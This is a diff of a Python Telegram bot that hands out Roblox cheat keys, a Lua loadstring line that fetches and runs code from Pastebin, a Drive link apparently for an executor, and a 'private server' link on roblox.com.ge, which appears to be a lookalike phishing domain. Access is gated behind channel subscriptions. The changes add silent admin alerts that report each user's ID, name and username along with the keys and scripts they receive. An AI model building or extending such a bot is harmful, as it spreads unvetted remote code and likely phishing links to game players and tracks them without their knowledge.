@@ -107,9 +107,15 @@ KEYS = ["МОПС", "СКИТ", "ТАКСА", "КИТ", "LARS", "MOPS", "ARDOR",
 PRIVATE_SERVER_LINK = "https://roblox.com.ge/games/142823291/Murder-Mystery-2?privateServerLinkCode=67807728184198406550153024608844"
 SCRIPT_LINK = "loadstring(game:HttpGet(\"https://pastebin.com/raw/GdQULgA6\"))()"
 DELTA_LINK = "https://drive.google.com/file/d/1G2gniClYv0qV0BU9-xfYD4UOcxUljH4s/view?usp=sharing"
-BOT_USERNAME = "larskeys_bot"
+BOT_USERNAME = "keyscripts3"
 
 bot = telebot.TeleBot(TOKEN)
+
+def notify_admin(text):
+    try:
+        bot.send_message(ADMIN_ID, text, parse_mode="Markdown")
+    except:
+        pass
 
 def is_admin(user_id):
     return user_id == ADMIN_ID
@@ -164,7 +170,13 @@ def start(message):
     args = message.text.split()
     is_ref = len(args) > 1 and args[1].startswith("ref_")
     ref_code = args[1].replace("ref_", "") if is_ref else None
-    add_user(message.from_user.id, ref_code)
+    is_new = add_user(message.from_user.id, ref_code)
+    
+    if is_new:
+        user = message.from_user
+        uname = f"@{user.username}" if user.username else "нет"
+        notify_admin(f"🆕 *Новый пользователь!*\n\n🆔 ID: `{user.id}`\n👤 Имя: {user.first_name}\n📛 Username: {uname}\n👥 Всего: {count_users()}")
+    
     if is_ref:
         bot.send_message(message.chat.id, "🔗 Ты перешёл по реферальной ссылке!\n\nПодпишись на каналы и нажми проверить:", reply_markup=get_channels_keyboard(is_ref=True))
     else:
@@ -177,6 +189,9 @@ def getkey(message):
     if not not_subbed:
         k = random.choice(KEYS)
         bot.send_message(message.chat.id, f"🔑 Твой ключ:\n\n`{k}`", parse_mode="Markdown")
+        user = message.from_user
+        uname = f"@{user.username}" if user.username else "нет"
+        notify_admin(f"🔑 *Ключ выдан!*\n\n👤 {user.first_name} ({uname})\n🆔 `{user.id}`\n🔑 Ключ: `{k}`")
     else:
         bot.send_message(message.chat.id, "📢 Подпишитесь на каналы для получения скрипта и ключа", reply_markup=get_unsub_keyboard(not_subbed))
 
@@ -220,6 +235,7 @@ def user_callback(call):
                     msg, script = get_ref_data(ref_code)
                     if script:
                         bot.send_message(call.message.chat.id, f"{msg}\n\n```lua\n{script}\n```", parse_mode="Markdown")
+                        notify_admin(f"🎯 *Скрипт выдан по реф. ссылке!*\n\n👤 {call.from_user.first_name}\n🆔 `{user_id}`\n🔗 Реф: `{ref_code}`")
                     else:
                         bot.send_message(call.message.chat.id, msg if msg else "✅ Подписка подтверждена!")
                 else:
@@ -235,11 +251,13 @@ def user_callback(call):
     elif action == "get_script":
         bot.send_message(call.message.chat.id, f"📜 Скрипт на все игры:\n\n```lua\n{SCRIPT_LINK}\n```", parse_mode="Markdown")
         bot.answer_callback_query(call.id)
+        notify_admin(f"📜 *Скрипт выдан!*\n\n👤 {call.from_user.first_name}\n🆔 `{user_id}`")
     
     elif action == "get_key":
         k = random.choice(KEYS)
         bot.send_message(call.message.chat.id, f"🔑 Твой ключ:\n\n`{k}`", parse_mode="Markdown")
         bot.answer_callback_query(call.id)
+        notify_admin(f"🔑 *Ключ выдан!*\n\n👤 {call.from_user.first_name}\n🆔 `{user_id}`\n🔑 Ключ: `{k}`")
     
     elif action == "get_private":
         bot.send_message(call.message.chat.id, f"🔒 Приватный сервер MM2\n\n{PRIVATE_SERVER_LINK}")
